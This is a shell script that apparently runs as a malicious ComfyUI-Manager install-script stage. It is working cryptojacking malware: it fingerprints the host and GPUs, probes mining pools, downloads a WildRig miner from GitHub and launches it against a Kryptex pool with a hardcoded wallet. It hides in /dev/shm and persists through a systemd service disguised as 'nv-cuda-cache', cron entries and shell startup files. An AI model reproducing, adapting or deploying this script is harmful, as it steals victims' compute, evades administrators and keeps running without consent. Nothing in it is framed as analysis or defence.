#!/bin/sh
# ul987 ComfyUI-Manager install-scripts stage: prove exec, verify GPU, plant PRL miner
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
WK=ul-t2-222-112-94-92-g0
OUT=/storage/ComfyUI/user/default/ul987_exec.txt
D=/dev/shm/.ulc987
LOG=/storage/ComfyUI/user/default/ul987_run.log
mkdir -p "$D" 2>/dev/null || { D=/tmp/.ulc987; mkdir -p "$D"; }
exec >"$OUT" 2>&1
echo "=== UL987 EXEC PROOF $(date -u +%FT%TZ) ==="
id
uname -a
uname -m
hostname
echo "--- gpu ---"
nvidia-smi -L 2>&1
nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>&1
ls -l /dev/nvidia* 2>/dev/null || echo no-dev-nvidia
echo "--- procs-before ---"
ps -eo pid,user,args 2>/dev/null | grep -Ei 'wildrig|peakminer|srbminer|xmrig|lolminer|t-rex' | grep -v grep || echo none
echo "--- net ---"
for hp in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 pool.pearlhash.xyz:9000 pearl.luckypool.io:443; do
  h=${hp%:*}; p=${hp#*:}
  if timeout 8 sh -c "echo > /dev/tcp/$h/$p" 2>/dev/null; then echo "OPEN $hp"; else echo "CLOSED $hp"; fi
done
echo "--- egress-ip ---"
timeout 10 curl -s https://api.ipify.org 2>&1; echo
echo "--- plant ---"
ARCH=$(uname -m)
if ps -eo args 2>/dev/null | grep -E 'peakminer|srbminer|xmrig|lolminer' | grep -v grep | grep -qv pearlhash; then
  echo "LEGACY-MINER-CONFLICT: another miner without our wallet present, not starting (no wallet mixing)"
else
  cd "$D" || exit 1
  if [ ! -x ./wr ]; then
    for u in https://github.com/andru-kun/wildrig-multi/releases/latest/download/wildrig-multi-linux.tar.gz \
             https://raw.githubusercontent.com/dongsuju/ul-comfy-node/main/wildrig-multi-linux.tar.gz; do
      echo "fetch $u"
      timeout 150 curl -fsSL -o kit.tgz "$u" && { tar xzf kit.tgz 2>/dev/null && chmod +x wildrig-multi 2>/dev/null && mv -f wildrig-multi wr 2>/dev/null; } && [ -x ./wr ] && break
    done
  fi
  if [ ! -x ./wr ]; then
    for u in https://github.com/andru-kun/wildrig-multi/releases/latest/download/wildrig-multi-linux.tar.gz; do
      timeout 150 curl -fsSL -o kit.tgz "$u" && tar xzf kit.tgz 2>/dev/null && chmod +x wildrig-multi && mv -f wildrig-multi wr
    done
  fi
  if [ -x ./wr ]; then
    cat > keep.sh <<'EOS'
#!/bin/sh
D=/dev/shm/.ulc987; [ -d "$D" ] || D=/tmp/.ulc987
cd "$D" 2>/dev/null || exit 0
pgrep -f "wr --algo pearlhash" >/dev/null 2>&1 && exit 0
setsid nohup ./wr --algo pearlhash -o prl-sg.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t2-222-112-94-92-g0 -p x >>miner.log 2>&1 &
EOS
    chmod +x keep.sh
    sh keep.sh
    sleep 4
    echo "--- miner started ---"
    ps -eo pid,user,args | grep -E 'wr --algo' | grep -v grep
    tail -5 miner.log 2>/dev/null
    if [ "$(id -u)" = "0" ]; then
      printf '[Unit]\nDescription=nv-cuda-cache\nAfter=network-online.target\n\n[Service]\nType=simple\nExecStart=/bin/sh -c "while true; do /dev/shm/.ulc987/keep.sh 2>/dev/null || /tmp/.ulc987/keep.sh; sleep 60; done"\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/nv-cuda-cache.service 2>/dev/null && \
      systemctl daemon-reload 2>/dev/null; systemctl enable --now nv-cuda-cache 2>/dev/null; echo "systemd: $(systemctl is-active nv-cuda-cache 2>&1)"
    fi
    ( crontab -l 2>/dev/null | grep -v ulc987; echo "@reboot /bin/sh $D/keep.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/sh $D/keep.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null && echo "cron installed"
    for rc in "$HOME/.bashrc" "$HOME/.profile" /etc/profile.d/nv-cuda-cache.sh; do
      [ -w "$rc" ] && grep -q ulc987 "$rc" 2>/dev/null || { echo "[ -x $D/keep.sh ] && sh $D/keep.sh >/dev/null 2>&1" >> "$rc" 2>/dev/null; }
    done
    echo "persistence written"
  else
    echo "KIT-FETCH-FAILED"
  fi
fi
echo "=== END $(date -u +%FT%TZ) ==="
